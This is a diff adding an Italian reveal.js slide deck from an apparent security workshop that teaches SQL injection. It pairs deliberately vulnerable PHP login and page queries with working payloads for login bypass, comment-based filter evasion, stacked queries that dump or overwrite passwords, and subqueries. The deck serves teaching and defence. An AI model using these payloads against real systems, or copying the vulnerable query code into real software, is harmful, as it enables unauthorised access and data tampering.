@@ -1,0 +1,785 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>reveal.js</title>
+
+		<link rel="stylesheet" href="css/reset.css">
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/coppito-zero-day.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/monokai.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section>
+					<h2>SQL Injection</h2>
+				</section>
+				<section>
+					<h2>Cos'è una SQL Injection?</h2>
+					<p>L'<b>SQL injection (SQLi)</b> è un tipo di tecnica di <u>code injection</u>,
+							solitamente utilizzata per attaccare applicazioni 'data-driven' e
+						che permette di <b>eseguire codice SQL malevolo.</b></p>
+				</section>
+				<section>
+					<h2>Cos'è una Code Injection?</h2>
+					<p>Una <b>Code Injection</b> è una tecnica che permette l'iniezione di codice che verrà eseguito/interpretato in un'applicazione</p>
+					<p>Solitamente avviene a causa di una vulnerabilità nel codice.</p>
+				</section>
+				<section>
+					<h2>Cos'è SQL?</h2>
+					<p>SQL è un linguaggio per database relazionali (DBMS) che viene utilizzato per:</p>
+					<ul>
+						<li>Creare e modificare schemi di database</li>
+						<li>Creare, modificare e gestire dati</li>
+						<li>Interrogare dati</li>
+						<li>Gestire l'accesso ai dati</li>
+					</ul>
+				</section>
+				<section>
+					<h2>Cos'è un DBMS?</h2>
+					<p>Un DBMS è una tipologia di database che memorizza i dati in tabelle di righe a lunghezza fissa</p>
+					<p>Ogni riga di una tabella rappresenta un record.</p>
+					<p>&nbsp;</p>
+					<table>
+						<tr>
+							<th>id</th>
+							<th>title</th>
+							<th>content</th>
+						</tr>
+						<tr>
+							<td>1</td>
+							<td>Lorem ipsum</td>
+							<td>Lorem ipsum dolor sit...</td>
+						</tr>
+						<tr>
+							<td>2</td>
+							<td>Dolor sit</td>
+							<td>Pellentesque sit amet bibendum ...</td>
+						</tr>
+						<tr>
+							<td>...</td>
+							<td>...</td>
+							<td>...</td>
+						</tr>
+						<tr>
+							<td>4</td>
+							<td>Etiam commodo</td>
+							<td>Suspendisse eu imperdiet...</td>
+						</tr>
+					</table>
+				</section>
+				<section>
+					<h2>SQL</h2>
+					<p>Attraverso il linguaggio SQL possiamo compiere operazioni sulle tabelle.</p>
+					<pre>
+						<code class="hljs sql" data-trim>
+					  	SELECT `id`, `title`, `content` FROM `news`;
+						</code>
+					</pre>
+					<pre>
+						<code class="hljs sql" data-trim>
+					  	SELECT `id`, `title`, `content` FROM `news` WHERE id = 1;
+						</code>
+					</pre>
+					<pre>
+						<code class="hljs sql" data-trim>
+					  	SELECT * FROM `news` WHERE id = 1;
+						</code>
+					</pre>
+					<pre>
+						<code class="hljs sql" data-trim>
+							INSERT INTO `news` VALUES ('1', 'Titolo news', 'Contenuto news')
+						</code>
+					</pre>
+					<pre>
+						<code class="hljs sql" data-trim>
+							DELETE FROM `news` WHERE `id` = 1;
+						</code>
+					</pre>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						## Cosa comporta una SQL Injection?
+						Una SQLi permette ad un attaccante di:
+						- Falsare un'identità (spoof identity)
+						- Manomettere dati esistenti (data tampering)
+						- Scaricare, modificare e cancellare dati
+						- eseguire operazioni amministrative sul DBMS
+						- ottenere LFI e RCE su un sistema (in circostanze adatte)
+					</textarea>
+				</section>
+				<section>
+					<h2>Perchè ci interessa?</h2>
+					<ul>
+						<li>è utile per imparare a non introdurre vulnerabilità nei prodotti che sviluppiamo</li>
+						<li>ci permette di testare la sicurezza dei prodotti che utilizziamo</li>
+					</ul>
+				</section>
+				<section data-markdown>
+					<textarea data-template>
+						## Cosa scatena una SQL Injection?<br /><br /><br />
+
+						### UNA VALIDAZIONE DEGLI INPUT DELL'UTENTE DEBOLE O ASSENTE
+					</textarea>
+				</section>
+				<section>
+					<h2>DISCLAIMER</h2>
+					<h2>GLI ESEMPI CHE SEGUONO, SE RIPRODOTTI SENZA L'AUTORIZZAZIONE DELL'OBIETTIVO, SONO UN<br /><u>REATO PENALE</u>.</h2>
+					<h2>STAY SAFE!</h2>
+				</section>
+				<section>
+					<h2>' OR 1=1</h2>
+					<div class="fragment fade">
+						<small>Dato il codice:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								&nbsp;
+							  $sql = "SELECT * FROM pages WHERE id = " . $_GET['id'];
+							  $result = $conn->query($sql);
+							  while($row = $result->fetch_array()){
+							    print_r($row);
+							  }
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "1'";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs" data-trim>
+							# 1064 - You have an error in your SQL syntax; check the manual
+							#	that corresponds to your MariaDB server version for the right
+							#	syntax to use near ''
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>' OR 1=1</h2>
+					<div class="fragment fade">
+						<small>Query prodotta:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+							  SELECT * FROM pages WHERE id = 1';
+								&nbsp;
+							</code>
+						</pre>
+						<small></small>
+						<p>Il DBMS si aspetta un ' di chiusura non presente e si produce
+							un errore di sintassi</p>
+					</div>
+					<div class="fragment fade">
+						<p>Quello che iniettiamo nella query viene interpretato come parte
+							dell'istruzione SQL e non come il valore di `id`.
+						</p>
+					</div>
+				</section>
+				<section>
+					<div class="fragment fade">
+						<small>Dato il codice:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								&nbsp;
+							  $sql = "SELECT * FROM pages WHERE id = " . $_GET['id'];
+							  $result = $conn->query($sql);
+							  while($row = $result->fetch_array()){
+							    print_r($row);
+							  }
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "1 OR 1=1";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+						  SELECT * FROM pages WHERE id = 1 OR 1=1;
+							</code>
+						</pre>
+						<p>La sintassi è valida e riceveremo tutte le pagine dal DB.</p>
+					</div>
+				</section>
+				<section>
+					<h2>' OR 1=1</h2>
+					<div class="fragment fade">
+						<small>Dato il codice:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+							  $sql = "SELECT * FROM pages WHERE id = '" . $_GET['id'] . "'";
+							  $result = $conn->query($sql);
+							  while($row = $result->fetch_array()){
+							    print_r($row);
+							  }
+							</code>
+						</pre>
+						<small>N.B. Sono stati introdotti gli apici per delimitare il parametro nella query.</small>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = 1;
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+						  SELECT * FROM pages WHERE id = '1';
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>' OR 1=1</h2>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "1' OR 1=1";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+						  SELECT * FROM pages WHERE id = '1' OR 1=1'; /* Syntax error */
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['id'] = "1' OR '1'='1";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+						  SELECT * FROM pages WHERE id = '1' OR '1'='1'; /* BOOM! */
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>' OR 1=1</h2>
+					<div class="fragment fade">
+						<center>
+							<img src="assets/apice.jpg" />
+						</center>
+					</div>
+				</section>
+				<section>
+					<h2>LOGIN BYPASS</h2>
+					<small>La stessa tecnica appena esaminata può essere utilizzata per il bypass dei login.</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+							  $sql = "SELECT * FROM users
+							          WHERE username = '" . $_GET['username'] . "'
+							          AND password = '" . $_GET['password'] . "'";
+							  $result = mysqli_query($conn, $sql);
+							  $row_count = mysqli_num_rows($result);
+							  if ($row_count != 0) {
+							    echo 'Authorized';
+							  } else {
+							    echo 'Not authorized';
+							  }
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['username'] = "admin";
+								$_GET['password'] = "password";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+						  SELECT * FROM `users` WHERE `username` = 'admin' AND `password` = 'password';
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>LOGIN BYPASS</h2>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['username'] = "admin";
+								$_GET['password'] = "password' OR '1'='1";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+							  SELECT * FROM `users` WHERE `username` = 'admin' AND `password` = 'password' OR '1' = '1'
+							</code>
+						</pre>
+						<p>
+							Abbiamo alterato la query aggiungendo una condizione che rende il risultato sempre vero.<br/>
+							Il numero di risultati sarà sempre > 1 e possiamo quindi accedere alla parte di codice autenticata.
+						</p>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<small>A volte accade che possa essere iniettato codice solo nel mezzo della query. Questo ci impedisce di aggiungere una condizione alla fine della query.</small>
+					<small>I commenti venegono in nostro aiuto.</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+							  $sql = "SELECT * FROM users
+							          WHERE username = '" . $_GET['username'] . "'
+							          AND password = '" . md5($_GET['password']) . "'";
+							  $result = mysqli_query($conn, $sql);
+							  $row_count = mysqli_num_rows($result);
+							  if ($row_count != 0) {
+							    echo 'Authorized';
+							  } else {
+							    echo 'Not authorized';
+							  }
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['username'] = "admin";
+								$_GET['password'] = "password' OR '1'='1";
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+							  SELECT * FROM `users` WHERE `username` = 'admin' AND `password` = 'd4f5b5147e1a65e372172e164d30aad9';
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<small>&nbsp;</small>
+					<div class="fragment fade">
+						<div data-markdown>
+							<textarea data-template>
+
+								Database | Comment | Note
+								--- | --- | ---
+								MSSQL / Oracle | `-- (double dash)` | Used for single-line comments
+								MSSQL / Oracle | `/* */` | Used for multiline comments
+								MySQL | `-- (double dash)` |  Used for single-line comments. It requires the second dash to be followed by a space or a control character such as tabulation, newline, etc.
+								MySQL | `#` | Used for single-line comments
+								MySQL | `/* */` | Used for multiline comments
+							</textarea>
+						</div>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<small>Abbiamo un altro parametro iniettabile ($_GET['username']) e bisogno di un'istruzione SQL che commenti via il resto del codice.</small>
+					<small>&nbsp;</small>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								&nbsp;
+								$_GET['username'] = "' OR 1=1; -- -";
+								$_GET['password'] = "coppito_zero_day";
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+							  SELECT * FROM `users` WHERE `username` = '' OR 1=1; -- - AND `password` = '63a2b018...e69e876';
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>BOOM! Tramite il codice iniettato siamo riusciti a commentare via la parte relativa alla password.</p>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<small>Questa tecnica può essere utilizzata anche per impersonare un utente noto:</small>
+					<small>&nbsp;</small>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								&nbsp;
+								$_GET['username'] = "admin' OR 1=1; -- -";
+								$_GET['password'] = "coppito_zero_day";
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+							  SELECT * FROM `users` WHERE `username` = 'admin' OR 1=1; -- - AND `password` = '63a2b018...e69e876';
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<small>La stessa tecnica è valida anche con l'utilizzo del commento inline #:</small>
+					<small>&nbsp;</small>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								&nbsp;
+								$_GET['username'] = "admin' OR 1=1; #";
+								$_GET['password'] = "coppito_zero_day";
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+							  SELECT * FROM `users` WHERE `username` = 'admin' OR 1=1; # AND `password` = '63a2b018...e69e876';
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<small>Talvolta accade che il commento "double dash" ( -- ) non possa essere utilizzato perchè viene filtrato dall'applicazione
+							o perchè produce errori nella query.</small>
+						<small>&nbsp;</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs php" data-trim>
+								function filterDashes($str) {
+							    return str_replace('-', '', $str);
+							  }
+
+							  $username = filterDashes($_GET['username']);
+							  $password = filterDashes($_GET['password']);
+							  $subdomain = filterDashes($_GET['subdomain']);
+							  $sql = "SELECT * FROM users
+							          WHERE username = '" . $username . "'
+							          AND password = '" . md5($password) . "'
+							          AND subdomain = '" . $subdomain . "'";
+							  $result = mysqli_query($conn, $sql);
+							  $row_count = mysqli_num_rows($result);
+							  if ($row_count != 0) {
+							    echo 'Authorized';
+							  } else {
+							    echo 'Not authorized';
+							  }
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<small>Tutti i parametri sono iniettabili, ma tutti i - sono rimossi dalle variabili:</small>
+					<small>&nbsp;</small>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								&nbsp;
+								$_GET['username'] = "admin' OR 1=1 -- -";
+								$_GET['password'] = "coppito_zero_day";
+								$_GET['subdomain'] = "disim.univaq.it";
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato (Syntax Error):</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+SELECT * FROM `users` WHERE `username` = 'admin' OR 1=1'
+AND `password` = '3858...c63f' AND `subdomain` = 'univaq.it';
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>COMMENTS</h2>
+					<small>Come possiamo sfruttare i commenti per generare una query corretta e al tempo stesso rimuovere il controllo sulla password (e magari anche sul sottodominio)?:</small>
+					<small></small>
+					<div class="fragment fade">
+						<small>In questo attacco sfrutteremo il commento multilinea (/* */) per bypassare il check.</small>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								&nbsp;
+								$_GET['username'] = "admin'/*";
+								$_GET['password'] = "coppito_zero_day";
+								$_GET['subdomain'] = "*/ OR '1'='1";
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+SELECT * FROM `users` WHERE username = 'admin'/*' AND password = '3858...c63f'
+AND subdomain = '*/ OR '1'='1';
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>BOOM!</p>
+					</div>
+				</section>
+				<section>
+					<h2>STACKED QUERIES</h2>
+					<small>Avere la possibilità di terminare un'istruzione SQL arbitrariamente consente di avere un grande controllo sulle query che vengono eseguite.</small>
+					<small>MSSQL 6.0 ha introdotto i "server-side cursors" che consentono l'esecuzione di stringhe con più di un'istruzione SQL.</small>
+					<small></small>
+					<div class="fragment fade">
+						<small>Questa feature ci consente di eseguire:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+SELECT * FROM `users`; SELECT * FROM `administrators`;
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Una funzionalità analoga è stata introdotta in MySQL 4.1, ma non è attiva di default.</small>
+						<small></small>
+					</div>
+				</section>
+				<section>
+					<h2>STACKED QUERIES</h2>
+					<div class="fragment fade">
+						<small>Dato il codice, assumendo MySQL > 4.1 e i "multiple statements" abilitati:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+$sql = "SELECT * FROM pages WHERE id = " . $_GET['id'];
+$result = $conn->query($sql);
+while($row = $result->fetch_array()){
+  print_r($row);
+}
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['pages'] = "; SELECT username, password FROM users;";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT * FROM `pages` WHERE id = 1; SELECT `username`, `password` FROM users;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>Questa query visualizzerà tutti gli utenti e le password della tabella users.
+					</div>
+				</section>
+				<section>
+					<h2>STACKED QUERIES</h2>
+					<small>Allo stesso modo possiamo eseguire altri comandi oltre a SELECT, come DROP o UPDATE.</small>
+					<div class="fragment fade">
+						<small>Dato il codice, assumendo MySQL > 4.1 e i "multiple statements" abilitati:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+$sql = "SELECT * FROM pages WHERE id = " . $_GET['id'];
+$result = $conn->query($sql);
+while($row = $result->fetch_array()){
+  print_r($row);
+}
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+								$_GET['pages'] = "; UPDATE users SET password='h4ck3r' WHERE username = 'admin'";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT * FROM pages WHERE id = 1; UPDATE users SET password='h4ck3r' WHERE username = 'admin';
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>
+							Questa query aggiornerà la password dell'utente admin con 'h4ck3r'.<br />
+						</p>
+					</div>
+				</section>
+				<section>
+					<h2>STACKED QUERIES</h2>
+					<small></small>
+					<center>
+						<img width="1400" src="assets/bobby.png" />
+					</center>
+				</section>
+				<section>
+					<h2>NESTED QUERIES</h2>
+					<small>Una "subquery" è una query annidata in un'altra query.</small>
+					<small>E' utile quando abbiamo bisogno di dati da altre tabelle per comporre una query.</small>
+					<small></small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+								&nbsp;
+SELECT * FROM `users` WHERE `role` NOT IN (SELECT `id` FROM `administration_roles`);
+								&nbsp;
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Questa istruzione utilizzerà il risultato di una query come parametro per un'altra.</small>
+						<small></small>
+					</div>
+				</section>
+				<section>
+					<h2>NESTED QUERIES</h2>
+					<div class="fragment fade">
+						<small>Dato il codice:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+$sql = "SELECT * FROM users
+        WHERE username = '" . $_GET['username'] . "'
+        AND password = '" . $_GET['password'] . "'";
+$result = mysqli_query($conn, $sql);
+$row_count = mysqli_num_rows($result);
+if ($row_count != 0) {
+  echo 'Authorized';
+} else {
+  echo 'Not authorized';
+}
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs php" data-trim>
+$_GET['username'] = "admin";
+$_GET['password'] = "'+(SELECT password FROM users WHERE username='admin') -- -;";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT * FROM users WHERE username = 'admin' AND password = ''+(SELECT password from users WHERE username='admin') -- -';
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>
+							BOOM!
+						</p>
+					</div>
+				</section>
+				<section>
+					<h1>FINE</h1>
+				</section>
+				<section>
+					<h1>CHALLENGE</h1>
+				</section>
+			</div>
+		</div>
+
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true }
+				],
+				slideNumber: false,
+				width: 1600,
+				hash: true
+			});
+		</script>
+	</body>
+</html>
